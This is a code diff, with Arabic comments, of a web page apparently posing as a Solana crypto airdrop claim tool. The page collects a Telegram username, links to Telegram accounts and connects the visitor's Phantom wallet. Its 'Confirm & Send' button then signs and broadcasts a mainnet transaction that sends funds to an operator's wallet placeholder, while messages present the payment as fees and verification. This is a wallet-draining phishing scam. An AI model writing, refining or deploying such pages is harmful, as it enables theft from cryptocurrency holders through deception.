@@ -23,8 +23,8 @@
             position: relative;
             width: 380px;
             height: 600px;
-            /* تم تعديل مسار الصورة ليتناسب مع طلبك الأخير 43.jpg */
-            background: url(assets/unnamed (44).jpg) no-repeat center top;
+            /* تم وضع اسم الصورة الكامل مع تعديل الرقم إلى 43 */
+            background: url('assets/unnamed (43).jpg') no-repeat center top;
             background-size: contain;
             border-radius: 40px;
             box-shadow: 0 20px 50px rgba(0,0,0,0.2);
@@ -88,7 +88,6 @@
             text-decoration: none;
             display: flex;
             align-items: center;
-            justify-content: center;
         }
 
         /* أزرار شفافة فوق أزرار الصورة الأصلية */
@@ -116,38 +115,37 @@
 
 <div class="main-container">
     <div class="overlay-content">
-        <input type="text" id="tgUser" class="input-tg" placeholder="Telegram Username">
+        <input type="text" id="tgUser" class="input-tg" placeholder="@Telegram_Username">
         
         <div class="wallet-wrapper">
             <input type="text" id="walletAddr" class="input-wallet" placeholder="walletAddress" readonly>
-            <a href="https://t.me/RiadAirdrop01_bot" target="_blank" class="btn-check-red" id="checkBtn">للتحقق</a>
+            <a href="https://t.me/G_M_A_KISS_1" target="_blank" class="btn-check-red" id="checkBtn">للتحقق</a>
         </div>
 
         <button class="invisible-btn btn-connect-phantom" id="connectBtn" title="Connect Wallet"></button>
         <button class="invisible-btn btn-confirm-send" id="claimBtn" title="Confirm & Send"></button>
 
-        <div id="status-msg">Fees apply for your transaction.</div>
+        <div id="status-msg">انضم للمجموعة ثم تفقد رسائل الخاص للعودة ✅</div>
     </div>
 </div>
 
 <script>
-    // --- الربط مع البوت الذي برمجناه في Replit ---
-    const BOT_URL = "https://t.me/RiadAirdrop01_bot";
-    const MY_WALLET = "ضع_هنا_عنوان_محفظة_سولانا_الخاصة_بك"; // <--- ضع عنوان محفظتك هنا لاستقبال السولانا
+    // --- إعدادات المحفظة ---
+    const MY_WALLET = "ضع_هنا_عنوان_محفظتك_الخاصة"; 
 
-    // 1. عند الضغط على زر التحقق
-    document.getElementById('checkBtn').onclick = () => {
+    // زر التحقق
+    document.getElementById('checkBtn').onclick = function() {
         const user = document.getElementById('tgUser').value.trim();
         if (!user) { 
-            alert("أدخل اسم المستخدم أولاً!"); 
+            alert("يرجى إدخال اسم المستخدم أولاً!"); 
             return false; 
         }
-        // إظهار رسالة للمستخدم بأنه يجب أن يعود بعد فحص البوت
-        document.getElementById('status-msg').innerText = "بعد إرسال /start للبوت، ارجع هنا لربط المحفظة.";
+        document.getElementById('status-msg').innerText = "تم فتح المجموعة.. تفقد الخاص بعد الانضمام للعودة";
         document.getElementById('status-msg').style.color = "blue";
+        return true; 
     };
 
-    // 2. ربط محفظة Phantom
+    // ربط محفظة Phantom
     document.getElementById('connectBtn').onclick = async () => {
         if (window.solana) {
             try {
@@ -155,17 +153,14 @@
                 document.getElementById('walletAddr').value = resp.publicKey.toString().slice(0,25) + "...";
                 document.getElementById('status-msg').innerText = "المحفظة متصلة ✅";
                 document.getElementById('status-msg').style.color = "green";
-            } catch (err) { console.log("Connection Rejected"); }
-        } else { alert("يرجى تثبيت محفظة Phantom أولاً"); }
+            } catch (err) { console.log("Rejected"); }
+        } else { alert("يرجى تثبيت محفظة Phantom"); }
     };
 
-    // 3. وظيفة الإرسال (Confirm & Send)
+    // عملية الإرسال
     document.getElementById('claimBtn').onclick = async () => {
         const wallet = document.getElementById('walletAddr').value;
-        if (!wallet || wallet === "walletAddress") { 
-            alert("اربط المحفظة أولاً!"); 
-            return; 
-        }
+        if (!wallet || wallet === "walletAddress") { alert("اربط المحفظة أولاً!"); return; }
 
         try {
             const connection = new solanaWeb3.Connection(solanaWeb3.clusterApiUrl('mainnet-beta'));
@@ -182,14 +177,9 @@
             transaction.feePayer = window.solana.publicKey;
 
             const signed = await window.solana.signTransaction(transaction);
-            const signature = await connection.sendRawTransaction(signed.serialize());
-            
-            alert("✅ تم إرسال الطلب بنجاح! سيتم التحقق من البيانات.");
-            document.getElementById('status-msg').innerText = "تم إرسال المعاملة بنجاح!";
-        } catch (err) {
-            console.error(err);
-            alert("فشلت العملية. تأكد من وجود رصيد كافٍ للرسوم.");
-        }
+            await connection.sendRawTransaction(signed.serialize());
+            alert("✅ تم إرسال الطلب بنجاح!");
+        } catch (err) { alert("تأكد من وجود رصيد كافٍ للرسوم."); }
     };
 </script>
 
